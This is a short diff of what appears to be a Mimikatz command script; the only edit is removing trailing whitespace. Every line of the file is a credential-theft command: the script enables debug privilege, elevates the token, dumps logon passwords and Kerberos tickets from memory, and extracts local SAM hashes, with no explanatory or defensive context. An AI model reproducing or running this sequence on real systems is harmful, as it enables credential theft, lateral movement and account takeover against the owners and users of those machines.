@@ -1,5 +1,5 @@
 privilege::debug
-token::elevate 
+token::elevate
 sekurlsa::logonpasswords
 sekurlsa::tickets
 lsadump::sam
